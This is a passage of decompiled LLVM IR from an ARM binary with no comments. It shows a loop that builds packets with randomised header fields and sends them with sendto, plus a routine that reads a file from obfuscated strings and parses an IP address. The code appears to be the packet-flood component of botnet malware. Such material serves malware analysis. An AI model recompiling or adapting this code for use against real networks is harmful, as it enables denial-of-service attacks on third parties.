  store i8 %v1_d514, i8* %v4_d514, align 1
  %v0_d518 = load i32, i32* @r5, align 4
  %v1_d518 = add i32 %v0_d518, 24
  %v2_d518 = inttoptr i32 %v1_d518 to i8*
  %v3_d518 = load i8, i8* %v2_d518, align 1
  %v4_d518 = zext i8 %v3_d518 to i32
  store i32 %v4_d518, i32* %r3.global-to-local, align 4
  %v1_d51c = add i32 %v0_d518, 25
  %v2_d51c = inttoptr i32 %v1_d51c to i8*
  %v3_d51c = load i8, i8* %v2_d51c, align 1
  %v4_d51c = zext i8 %v3_d51c to i32
  %v4_d520 = mul nuw nsw i32 %v4_d51c, 256
  %v5_d520 = or i32 %v4_d520, %v4_d518
  store i32 %v5_d520, i32* %r2.global-to-local, align 4
  %v3_d524 = load i32, i32* %stack_var_-44, align 4
  %v0_d528 = load i32, i32* @r6, align 4
  store i32 %v0_d528, i32* @r1, align 4
  %v1_d52c = add i32 %v3_d524, 12
  store i32 %v1_d52c, i32* %r3.global-to-local, align 4
  %v4_d534 = call i32 @function_de80(i32 %v0_d518, i32 %v0_d528, i32 %v5_d520, i32 %v1_d52c)
  %v5_d534 = trunc i32 %v4_d534 to i8
  %v4_d53825 = udiv i32 %v4_d534, 256
  %v1_d53c = trunc i32 %v4_d53825 to i8
  %v2_d53c = load i32, i32* @r6, align 4
  %v3_d53c = add i32 %v2_d53c, 7
  %v4_d53c = inttoptr i32 %v3_d53c to i8*
  store i8 %v1_d53c, i8* %v4_d53c, align 1
  %v3_d540 = load i32, i32* @r6, align 4
  %v4_d540 = add i32 %v3_d540, 6
  %v5_d540 = inttoptr i32 %v4_d540 to i8*
  store i8 %v5_d534, i8* %v5_d540, align 1
  %v3_d544 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d544, i32* %r3.global-to-local, align 4
  %v0_d548 = load i32, i32* @r5, align 4
  %v1_d548 = add i32 %v0_d548, 20
  %v2_d548 = inttoptr i32 %v1_d548 to i32*
  %v3_d548 = load i32, i32* %v2_d548, align 4
  %v5_d550 = mul i32 %v3_d544, 24
  %v1_d554 = load i32, i32* @sl, align 4
  %v2_d554 = add i32 %v1_d554, %v5_d550
  store i32 %v2_d554, i32* %ip.global-to-local, align 4
  %v3_d558 = udiv i32 %v3_d548, 65536
  store i32 %v3_d558, i32* %r2.global-to-local, align 4
  %v1_d55c = trunc i32 %v3_d558 to i8
  %v3_d55c = add i32 %v2_d554, 2
  %v4_d55c = inttoptr i32 %v3_d55c to i8*
  store i8 %v1_d55c, i8* %v4_d55c, align 1
  %v0_d560 = load i32, i32* %r2.global-to-local, align 4
  %v3_d56026 = udiv i32 %v0_d560, 256
  %v3_d564 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d564, i32* %r2.global-to-local, align 4
  %v1_d568 = trunc i32 %v3_d56026 to i8
  %v2_d568 = load i32, i32* %ip.global-to-local, align 4
  %v3_d568 = add i32 %v2_d568, 3
  %v4_d568 = inttoptr i32 %v3_d568 to i8*
  store i8 %v1_d568, i8* %v4_d568, align 1
  %v0_d56c = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_d574 = load i32, i32* %r2.global-to-local, align 4
  %v1_d574 = add i32 %v0_d574, 32
  store i32 %v1_d574, i32* %r2.global-to-local, align 4
  %v0_d578 = load i32, i32* %fp.global-to-local, align 4
  %v0_d580 = load i32, i32* %ip.global-to-local, align 4
  %v4_d580 = inttoptr i32 %v0_d580 to %sockaddr*
  %v7_d588 = inttoptr i32 %v0_d56c to i32*
  %v9_d588 = call i32 @sendto(i32 %v0_d578, i32* %v7_d588, i32 %v1_d574, i32 16384, %sockaddr* %v4_d580, i32 16)
  %v3_d58c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d58c, i32* %r3.global-to-local, align 4
  %v1_d590 = add i32 %v3_d58c, 1
  %v1_d594 = load i32, i32* %sb.global-to-local, align 4
  %v9_d594 = icmp eq i32 %v1_d590, %v1_d594
  store i1 %v9_d594, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d590, i32* %stack_var_-40, align 4
  %v5_d59c = icmp slt i32 %v1_d590, %v1_d594
  br i1 %v5_d59c, label %dec_label_pc_d4a0, label %dec_label_pc_d5a0

dec_label_pc_d5a0:                                ; preds = %dec_label_pc_d4f0
  %v2_d5a0 = icmp eq i32 %v1_d594, 0
  store i1 %v2_d5a0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d490.outer

dec_label_pc_d5ac:                                ; preds = %dec_label_pc_d4a0
  %v1_d5ac = add i32 %v2_d4a8, 16
  %v2_d5ac = inttoptr i32 %v1_d5ac to i32*
  %v3_d5ac = load i32, i32* %v2_d5ac, align 4
  store i32 %v3_d5ac, i32* @r4, align 4
  %v0_d5b0 = call i32 @function_f6c4()
  %v3_d5b4 = load i32, i32* %stack_var_-40, align 4
  %v5_d5bc = mul i32 %v3_d5b4, 24
  %v0_d5c0 = load i32, i32* @r4, align 4
  %v1_d5c4 = and i32 %v0_d5c0, 65280
  store i32 %v1_d5c4, i32* %r3.global-to-local, align 4
  %v1_d5c0 = udiv i32 %v0_d5c0, 256
  %v3_d5c8 = and i32 %v1_d5c0, 65280
  store i32 %v3_d5c8, i32* %r2.global-to-local, align 4
  %v1_d5cc = load i32, i32* @sl, align 4
  %v2_d5cc = add i32 %v1_d5cc, %v5_d5bc
  store i32 %v2_d5cc, i32* %ip.global-to-local, align 4
  %v1_d5d8 = add i32 %v2_d5cc, 20
  %v2_d5d8 = inttoptr i32 %v1_d5d8 to i8*
  %v3_d5d8 = load i8, i8* %v2_d5d8, align 1
  %v4_d5d8 = zext i8 %v3_d5d8 to i32
  store i32 %v4_d5d8, i32* %lr.global-to-local, align 4
  %v2_d5e0 = call i32 @llvm.bswap.i32(i32 %v0_d5c0)
  %v7_d5e4 = lshr i32 %v0_d5b0, %v4_d5d8
  %v8_d5e4 = add i32 %v7_d5e4, %v2_d5e0
  store i32 %v3_d2f8, i32* %r2.global-to-local, align 4
  %v2_d604 = call i32 @llvm.bswap.i32(i32 %v8_d5e4)
  store i32 %v2_d604, i32* %r3.global-to-local, align 4
  %v1_d608 = load i32, i32* %r7.global-to-local, align 4
  %v9_d608 = icmp eq i32 %v3_d2f8, %v1_d608
  store i1 %v9_d608, i1* %cpsr_z.global-to-local, align 1
  %v1_d60c = load i32, i32* @r5, align 4
  %v2_d60c = add i32 %v1_d60c, 16
  %v3_d60c = inttoptr i32 %v2_d60c to i32*
  store i32 %v2_d604, i32* %v3_d60c, align 4
  br i1 %v9_d608, label %dec_label_pc_d614, label %dec_label_pc_d5ac.dec_label_pc_d4d8_crit_edge

dec_label_pc_d5ac.dec_label_pc_d4d8_crit_edge:    ; preds = %dec_label_pc_d5ac
  %v1_d4dc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d4d8

dec_label_pc_d614:                                ; preds = %dec_label_pc_d5ac, %dec_label_pc_d4cc
  %v0_d614 = call i32 @function_f6c4()
  %v1_d614 = trunc i32 %v0_d614 to i8
  %v4_d61827 = udiv i32 %v0_d614, 256
  %v1_d61c = trunc i32 %v4_d61827 to i8
  %v2_d61c = load i32, i32* @r5, align 4
  %v3_d61c = add i32 %v2_d61c, 5
  %v4_d61c = inttoptr i32 %v3_d61c to i8*
  store i8 %v1_d61c, i8* %v4_d61c, align 1
  store i32 %v3_d2fc, i32* %r3.global-to-local, align 4
  %v1_d624 = load i32, i32* %r7.global-to-local, align 4
  %v9_d624 = icmp eq i32 %v3_d2fc, %v1_d624
  store i1 %v9_d624, i1* %cpsr_z.global-to-local, align 1
  %v3_d628 = load i32, i32* @r5, align 4
  %v4_d628 = add i32 %v3_d628, 4
  %v5_d628 = inttoptr i32 %v4_d628 to i8*
  store i8 %v1_d614, i8* %v5_d628, align 1
  %v0_d62c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d62c, label %dec_label_pc_d630, label %dec_label_pc_d614.dec_label_pc_d4e4_crit_edge

dec_label_pc_d614.dec_label_pc_d4e4_crit_edge:    ; preds = %dec_label_pc_d614
  %v1_d4e8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d4e4

dec_label_pc_d630:                                ; preds = %dec_label_pc_d614, %dec_label_pc_d4d8
  %v0_d630 = call i32 @function_f6c4()
  %v1_d630 = trunc i32 %v0_d630 to i8
  %v4_d638 = sdiv i32 %v0_d630, 256
  store i32 %v4_d638, i32* %r3.global-to-local, align 4
  %v1_d63c = load i32, i32* %r7.global-to-local, align 4
  %v9_d63c = icmp eq i32 %v3_d300, %v1_d63c
  store i1 %v9_d63c, i1* %cpsr_z.global-to-local, align 1
  %v3_d640 = load i32, i32* @r5, align 4
  %v4_d640 = add i32 %v3_d640, 20
  %v5_d640 = inttoptr i32 %v4_d640 to i8*
  store i8 %v1_d630, i8* %v5_d640, align 1
  %v0_d644 = load i32, i32* %r3.global-to-local, align 4
  %v1_d644 = trunc i32 %v0_d644 to i8
  %v2_d644 = load i32, i32* @r6, align 4
  %v3_d644 = add i32 %v2_d644, 1
  %v4_d644 = inttoptr i32 %v3_d644 to i8*
  store i8 %v1_d644, i8* %v4_d644, align 1
  %v0_d648 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d648, label %dec_label_pc_d64c, label %dec_label_pc_d4f0

dec_label_pc_d64c:                                ; preds = %dec_label_pc_d630, %dec_label_pc_d4e4
  %v0_d64c = call i32 @function_f6c4()
  %v1_d64c = trunc i32 %v0_d64c to i8
  %v4_d650 = sdiv i32 %v0_d64c, 256
  store i32 %v4_d650, i32* %r3.global-to-local, align 4
  %v1_d654 = trunc i32 %v4_d650 to i8
  %v2_d654 = load i32, i32* @r6, align 4
  %v3_d654 = add i32 %v2_d654, 3
  %v4_d654 = inttoptr i32 %v3_d654 to i8*
  store i8 %v1_d654, i8* %v4_d654, align 1
  %v3_d658 = load i32, i32* @r6, align 4
  %v4_d658 = add i32 %v3_d658, 2
  %v5_d658 = inttoptr i32 %v4_d658 to i8*
  store i8 %v1_d64c, i8* %v5_d658, align 1
  br label %dec_label_pc_d4f0

dec_label_pc_d660:                                ; preds = %dec_label_pc_d2c0
  %v0_d660 = load i32, i32* %fp.global-to-local, align 4
  %v1_d664 = call i32 @close(i32 %v0_d660)
  br label %dec_label_pc_d668

dec_label_pc_d668:                                ; preds = %dec_label_pc_d1b0, %dec_label_pc_d660
  %v29_d66c = phi i32 [ -1, %dec_label_pc_d1b0 ], [ %v1_d664, %dec_label_pc_d660 ]
  store i32 %v3_d1b0, i32* %r4.global-to-local, align 4
  store i32 %v6_d1b0, i32* %r5.global-to-local, align 4
  store i32 %v9_d1b0, i32* %r6.global-to-local, align 4
  store i32 %v12_d1b0, i32* %r7.global-to-local, align 4
  ret i32 %v29_d66c

; uselistorder directives
  uselistorder i32 %v4_d650, { 1, 0 }
  uselistorder i32 %v2_d604, { 1, 0 }
  uselistorder i32 %v0_d5c0, { 1, 0, 2 }
  uselistorder i1 %v2_d5a0, { 1, 0 }
  uselistorder i32 %v1_d594, { 0, 2, 3, 1 }
  uselistorder i32 %v1_d590, { 2, 0, 3, 1 }
  uselistorder i32 %v3_d558, { 1, 0 }
  uselistorder i32 %v4_d504, { 1, 0 }
  uselistorder i1 %v3_d4d0, { 1, 0 }
  uselistorder i32 %v1_d478, { 1, 0, 2, 3 }
  uselistorder i32 %v1_d41c, { 1, 0 }
  uselistorder i32 %v1_d3a4, { 1, 0 }
  uselistorder i32 %v1_d324, { 1, 0 }
  uselistorder i32 %v1_d320, { 1, 0 }
  uselistorder i32 %v0_d2f0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_d2e8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_d250, { 1, 2, 0 }
  uselistorder i32 %v6_d224, { 2, 1, 3, 0 }
  uselistorder i32 %v6_d1e8, { 1, 2, 0 }
  uselistorder i32 %v1_d1b4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 1, 13, 12 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 4, 1, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 0, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 -8, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_d668, { 1, 0 }
  uselistorder label %dec_label_pc_d4f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d490, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_d674(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d674:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-2120 = alloca i32, align 4
  %v3_d674 = load i32, i32* @r4, align 4
  %v6_d674 = load i32, i32* @r5, align 4
  %v9_d674 = load i32, i32* @r6, align 4
  %v12_d674 = load i32, i32* @r7, align 4
  %v15_d674 = load i32, i32* @r8, align 4
  %v18_d674 = load i32, i32* @sb, align 4
  %v21_d674 = load i32, i32* @sl, align 4
  %v24_d674 = load i32, i32* @fp, align 4
  %v1_d680 = urem i32 %arg1, 256
  store i32 %v1_d680, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_d68c = urem i32 %arg3, 256
  store i32 %v1_d68c, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_d698 = call i32* @calloc(i32 %v1_d680, i32 4)
  %v4_d698 = ptrtoint i32* %v2_d698 to i32
  %v0_d69c = load i32, i32* @r5, align 4
  store i32 %v0_d69c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d6a8 = load i32, i32* @r4, align 4
  store i32 %v0_d6a8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_d6b0 = inttoptr i32 %v0_d69c to i32*
  %v6_d6b0 = call i32 @function_930c(i32 %v0_d6a8, i32* %v5_d6b0, i32 2, i32 0, i32 %v4_d698)
  %v1_d6bc = urem i32 %v6_d6b0, 256
  store i32 %v1_d6bc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d6c8 = load i32, i32* @r4, align 4
  store i32 %v0_d6c8, i32* %r0.global-to-local, align 4
  %v0_d6cc = load i32, i32* @r5, align 4
  store i32 %v0_d6cc, i32* %r1.global-to-local, align 4
  %v5_d6d0 = trunc i32 %v6_d6b0 to i8
  %v6_d6d4 = inttoptr i32 %v0_d6cc to i32*
  %v7_d6d4 = call i32 @function_930c(i32 %v0_d6c8, i32* %v6_d6d4, i32 3, i32 65535, i32 %v6_d6b0)
  %v0_d6d8 = load i32, i32* @r5, align 4
  store i32 %v0_d6d8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_d6e4 = load i32, i32* @r4, align 4
  store i32 %v0_d6e4, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_d6ec = inttoptr i32 %v0_d6d8 to i32*
  %v6_d6ec = call i32 @function_930c(i32 %v0_d6e4, i32* %v5_d6ec, i32 4, i32 64, i32 %v7_d6d4)
  %v1_d6f4 = urem i32 %v6_d6ec, 256
  store i32 %v1_d6f4, i32* %ip.global-to-local, align 4
  %v0_d6f8 = load i32, i32* @r5, align 4
  store i32 %v0_d6f8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d704 = load i32, i32* @r4, align 4
  store i32 %v0_d704, i32* %r0.global-to-local, align 4
  %sext36 = mul i32 %v6_d6ec, 16777216
  %v5_d70c = sdiv i32 %sext36, 16777216
  %v6_d70c = inttoptr i32 %v0_d6f8 to i32*
  %v7_d70c = call i32 @function_930c(i32 %v0_d704, i32* %v6_d70c, i32 5, i32 0, i32 %v5_d70c)
  %v1_d718 = urem i32 %v7_d70c, 256
  store i32 %v1_d718, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d724 = load i32, i32* @r4, align 4
  store i32 %v0_d724, i32* %r0.global-to-local, align 4
  %v0_d728 = load i32, i32* @r5, align 4
  store i32 %v0_d728, i32* %r1.global-to-local, align 4
  %v5_d730 = inttoptr i32 %v0_d728 to i32*
  %v6_d730 = call i32 @function_930c(i32 %v0_d724, i32* %v5_d730, i32 6, i32 65535, i32 %v1_d718)
  %v0_d734 = load i32, i32* @r5, align 4
  store i32 %v0_d734, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  store i32 %v6_d730, i32* %fp.global-to-local, align 4
  %v0_d744 = load i32, i32* @r4, align 4
  store i32 %v0_d744, i32* %r0.global-to-local, align 4
  %v5_d748 = inttoptr i32 %v0_d734 to i32*
  %v6_d748 = call i32 @function_930c(i32 %v0_d744, i32* %v5_d748, i32 7, i32 53, i32 ptrtoint (i32* @0 to i32))
  %v0_d750 = load i32, i32* @r5, align 4
  store i32 %v0_d750, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v6_d748, i32* %sb.global-to-local, align 4
  %v0_d760 = load i32, i32* @r4, align 4
  store i32 %v0_d760, i32* %r0.global-to-local, align 4
  %v5_d764 = inttoptr i32 %v0_d750 to i32*
  %v6_d764 = call i32 @function_930c(i32 %v0_d760, i32* %v5_d764, i32 9, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_d768 = load i32, i32* @r5, align 4
  store i32 %v0_d768, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 %v6_d764, i32* @sl, align 4
  %v0_d778 = load i32, i32* @r4, align 4
  store i32 %v0_d778, i32* %r0.global-to-local, align 4
  %v5_d77c = inttoptr i32 %v0_d768 to i32*
  %v6_d77c = call i32 @function_930c(i32 %v0_d778, i32* %v5_d77c, i32 0, i32 12, i32 ptrtoint (i32* @0 to i32))
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d788 = load i32, i32* @r5, align 4
  store i32 %v0_d788, i32* %r1.global-to-local, align 4
  store i32 %v6_d77c, i32* %r8.global-to-local, align 4
  %v0_d790 = load i32, i32* @r4, align 4
  store i32 %v0_d790, i32* %r0.global-to-local, align 4
  %v4_d794 = inttoptr i32 %v0_d788 to i32*
  %v5_d794 = call i32 @function_8ef8(i32 %v0_d790, i32* %v4_d794, i32 8, i32 0)
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_d7a0 = call i32 @function_11394(i32 24)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_d7ac = call i32 @function_112b0(i32 24, i32* null)
  %v4_d7ac = inttoptr i32 %v3_d7ac to i8*
  store i32 %v3_d7ac, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_d7b4 = call i32 (i8*, i32, ...) @open(i8* %v4_d7ac, i32 0)
  store i32 %v4_d7b4, i32* @r4, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_d7c0 = call i32 @function_112dc(i32 24)
  store i32 %v1_d7c0, i32* %r0.global-to-local, align 4
  %v0_d7c4 = load i32, i32* @r4, align 4
  %v1_d7c4 = icmp slt i32 %v0_d7c4, 0
  %v2_d7c4 = icmp eq i32 %v0_d7c4, 0
  store i1 %v2_d7c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_d7c4, label %dec_label_pc_dd90, label %dec_label_pc_d7cc

dec_label_pc_d7cc:                                ; preds = %dec_label_pc_d674
  %v2_d7d0 = ptrtoint i32* %stack_var_-2120 to i32
  store i32 %v2_d7d0, i32* @r6, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 %v2_d7d0, i32* %r1.global-to-local, align 4
  store i32 %v0_d7c4, i32* %r0.global-to-local, align 4
  %v4_d7e0 = call i32 @read(i32 %v0_d7c4, i32* nonnull %stack_var_-2120, i32 2048)
  store i32 %v4_d7e0, i32* @r5, align 4
  %v0_d7e8 = load i32, i32* @r4, align 4
  store i32 %v0_d7e8, i32* %r0.global-to-local, align 4
  %v1_d7ec = call i32 @close(i32 %v0_d7e8)
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_d7f4 = call i32 @function_11394(i32 25)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_d800 = call i32 @function_112b0(i32 25, i32* null)
  %v0_d804 = load i32, i32* @r5, align 4
  store i32 %v0_d804, i32* @r1, align 4
  store i32 %v3_d800, i32* %r2.global-to-local, align 4
  store i32 %v2_d7d0, i32* %r0.global-to-local, align 4
  %v3_d810 = bitcast i32* %stack_var_-2120 to i8*
  %v4_d810 = call i32 @function_11d30(i8* %v3_d810, i32 %v0_d804, i32 %v3_d800)
  store i32 %v4_d810, i32* @r4, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_d81c = call i32 @function_112dc(i32 25)
  store i32 %v1_d81c, i32* %r0.global-to-local, align 4
  %v0_d820 = load i32, i32* @r4, align 4
  %v2_d820 = icmp eq i32 %v0_d820, -1
  store i1 %v2_d820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d820, label %dec_label_pc_dd90, label %dec_label_pc_d828

dec_label_pc_d828:                                ; preds = %dec_label_pc_d7cc
  %v0_d828 = load i32, i32* @r5, align 4
  %v9_d828 = icmp eq i32 %v0_d828, %v0_d820
  store i1 %v9_d828, i1* %cpsr_z.global-to-local, align 1
  %v7_d82c = icmp sgt i32 %v0_d828, %v0_d820
  br i1 %v7_d82c, label %dec_label_pc_d830, label %dec_label_pc_dd90

dec_label_pc_d830:                                ; preds = %dec_label_pc_d828
  store i32 %v0_d828, i32* %r3.global-to-local, align 4
  store i32 %v0_d820, i32* %r2.global-to-local, align 4
  %v0_d840 = load i32, i32* @r6, align 4
  %v2_d840 = add i32 %v0_d840, %v0_d820
  store i32 %v2_d840, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v2_d848 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_d848, i32* %r7.global-to-local, align 4
  %v1_d878 = add i32 %v0_d828, -1
  br label %dec_label_pc_d870

dec_label_pc_d854:                                ; preds = %dec_label_pc_d898, %bb139
  %v9_d854 = icmp eq i32 %v0_d860, %v1_d878
  store i1 %v9_d854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d854, label %dec_label_pc_d8a4, label %dec_label_pc_d85c

dec_label_pc_d85c:                                ; preds = %dec_label_pc_d888, %dec_label_pc_d854, %bb
  %v0_d89443 = phi i32 [ %v0_d894, %dec_label_pc_d888 ], [ %v0_d89444, %dec_label_pc_d854 ], [ %v0_d894, %bb ]
  %v0_d87439 = phi i32 [ 0, %dec_label_pc_d888 ], [ %v0_d87440, %dec_label_pc_d854 ], [ 0, %bb ]
  store i32 %v0_d828, i32* %r0.global-to-local, align 4
  %v1_d860 = add i32 %v0_d860, 1
  store i32 %v1_d860, i32* %r2.global-to-local, align 4
  %v9_d864 = icmp eq i32 %v0_d828, %v1_d860
  store i1 %v9_d864, i1* %cpsr_z.global-to-local, align 1
  %v1_d868 = add i32 %v0_d868, 1
  store i32 %v1_d868, i32* %r7.global-to-local, align 4
  br i1 %v9_d864, label %dec_label_pc_dd90, label %dec_label_pc_d870

dec_label_pc_d870:                                ; preds = %dec_label_pc_d85c, %dec_label_pc_d830
  %v0_d868 = phi i32 [ %v1_d868, %dec_label_pc_d85c ], [ %v2_d848, %dec_label_pc_d830 ]
  %v0_d860 = phi i32 [ %v1_d860, %dec_label_pc_d85c ], [ %v0_d820, %dec_label_pc_d830 ]
  %v0_d894 = phi i32 [ %v0_d89443, %dec_label_pc_d85c ], [ 0, %dec_label_pc_d830 ]
  %v0_d874 = phi i32 [ %v0_d87439, %dec_label_pc_d85c ], [ 0, %dec_label_pc_d830 ]
  %v0_d87c = phi i32 [ %v1_d87c, %dec_label_pc_d85c ], [ %v2_d840, %dec_label_pc_d830 ]
  %v1_d870 = inttoptr i32 %v0_d87c to i8*
  %v2_d870 = load i8, i8* %v1_d870, align 1
  %v3_d870 = zext i8 %v2_d870 to i32
  store i32 %v3_d870, i32* %r3.global-to-local, align 4
  %v2_d874 = icmp eq i32 %v0_d874, 0
  store i1 %v2_d874, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d878, i32* %ip.global-to-local, align 4
  %v1_d87c = add i32 %v0_d87c, 1
  store i32 %v1_d87c, i32* %r1.global-to-local, align 4
  %v1_d880 = add nsw i32 %v3_d870, -48
  store i32 %v1_d880, i32* %r0.global-to-local, align 4
  br i1 %v2_d874, label %dec_label_pc_d888, label %dec_label_pc_d898

dec_label_pc_d888:                                ; preds = %dec_label_pc_d870
  %v7_d888 = icmp eq i8 %v2_d870, 9
  store i1 %v7_d888, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d888, label %dec_label_pc_d85c, label %bb

bb:                                               ; preds = %dec_label_pc_d888
  %v8_d88c = icmp eq i8 %v2_d870, 32
  store i1 %v8_d88c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_d88c, label %dec_label_pc_d85c, label %dec_label_pc_d894

dec_label_pc_d894:                                ; preds = %bb
  %v1_d894 = add i32 %v0_d894, 1
  store i32 %v1_d894, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_d898

dec_label_pc_d898:                                ; preds = %dec_label_pc_d870, %dec_label_pc_d894
  %v0_d89444 = phi i32 [ %v0_d894, %dec_label_pc_d870 ], [ %v1_d894, %dec_label_pc_d894 ]
  %v0_d87440 = phi i32 [ %v0_d874, %dec_label_pc_d870 ], [ %v1_d894, %dec_label_pc_d894 ]
  %v7_d898 = icmp eq i8 %v2_d870, 46
  store i1 %v7_d898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d898, label %dec_label_pc_d854, label %bb139

bb139:                                            ; preds = %dec_label_pc_d898
  %v8_d89c = icmp eq i32 %v1_d880, 9
  store i1 %v8_d89c, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_d880, 10
  br i1 %tmp, label %dec_label_pc_d854, label %dec_label_pc_d8a4

dec_label_pc_d8a4:                                ; preds = %dec_label_pc_d854, %bb139
  %v0_d860.lcssa = phi i32 [ %v1_d878, %dec_label_pc_d854 ], [ %v0_d860, %bb139 ]
  %v2_d8a8 = sub i32 %v0_d860.lcssa, %v0_d820
  store i32 %v2_d8a8, i32* %r2.global-to-local, align 4
  store i32 %v2_d840, i32* %r1.global-to-local, align 4
  store i32 %v2_d848, i32* %r0.global-to-local, align 4
  %v3_d8b4 = call i32 @function_11a58(i32 %v2_d848, i32 %v2_d840, i32 %v2_d8a8)
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp140 = bitcast i32* %stack_var_-72 to i8*
  store i32 %v2_d848, i32* %r0.global-to-local, align 4
  %v2_d8c4 = load i32, i32* %r7.global-to-local, align 4
  %v3_d8c4 = inttoptr i32 %v2_d8c4 to i8*
  store i8 0, i8* %v3_d8c4, align 1
  %v3_d8c8 = call i32 @inet_addr(i8* %tmp140)
  store i32 %v3_d8c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d8d0

dec_label_pc_d8d020:                              ; preds = %dec_label_pc_dd90
  unreachable

dec_label_pc_d8d0:                                ; preds = %dec_label_pc_de08, %dec_label_pc_ddf8, %dec_label_pc_ddec, %dec_label_pc_ddd8, %dec_label_pc_d8a4
  %v29_ddd475 = phi i32 [ %v1_dd94, %dec_label_pc_de08 ], [ %v1_dd94, %dec_label_pc_ddf8 ], [ %v1_dd94, %dec_label_pc_ddec ], [ %v1_dd94, %dec_label_pc_ddd8 ], [ %v3_d8c8, %dec_label_pc_d8a4 ]
